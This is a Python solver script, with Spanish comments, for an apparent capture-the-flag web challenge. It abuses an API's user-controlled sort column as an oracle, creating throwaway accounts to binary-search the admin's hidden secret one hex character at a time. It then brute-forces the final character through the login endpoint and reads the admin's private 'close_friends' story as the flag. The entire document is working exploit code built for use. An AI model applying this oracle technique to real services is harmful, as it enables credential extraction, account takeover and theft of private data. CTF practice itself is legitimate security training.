import requests

BASE = "https://bf11748a-1c17-4db4-90eb-04e6ca3f1e5b.play.gaslightctf.cooking:1337/"   # ajustá host/puerto
ALPH = "0123456789abcdef"
c = [0]

def admin_after_pivot(pivot: str) -> bool:
    """True si admin.secret > pivot (admin ordena después nuestro en ASC)."""
    c[0] += 1
    user = f"pwn{c[0]}"
    s = requests.Session()
    r = s.post(f"{BASE}/api/signup", json={"name": user, "password": pivot})
    r.raise_for_status()
    s.post(f"{BASE}/api/stories",
           json={"story": "hi", "visibility": "public", "minutes": 60})
    rows = s.get(f"{BASE}/api/stories",
                 params={"column": "secret", "order": "ASC"}).json()
    pub = [x["author"] for x in rows if x["visibility"] == "public"]
    if "admin" not in pub:
        raise SystemExit("admin no está en publicStories: la instancia expiró (>1h). Reiniciala.")
    return pub.index("admin") > pub.index(user)

# Recuperamos 15 chars con el oráculo (sin empates: el pivote es más corto que el secret).
known = ""
for _ in range(15):
    lo, hi, res = 0, len(ALPH) - 1, 0
    while lo <= hi:
        mid = (lo + hi) // 2
        if admin_after_pivot(known + ALPH[mid]):   # realchar >= ALPH[mid]
            res = mid; lo = mid + 1
        else:
            hi = mid - 1
    known += ALPH[res]
    print("secret:", known)

# El char 16 lo confirmamos por login (evita el empate exacto pivote==secret).
for ch in ALPH:
    cand = known + ch
    s = requests.Session()
    if s.post(f"{BASE}/api/login", json={"name": "admin", "password": cand}).ok:
        print("admin secret:", cand)
        rows = s.get(f"{BASE}/api/stories",
                     params={"column": "name", "order": "ASC"}).json()
        for row in rows:
            if row["author"] == "admin" and row["visibility"] == "close_friends":
                print("FLAG:", row["story"])
        break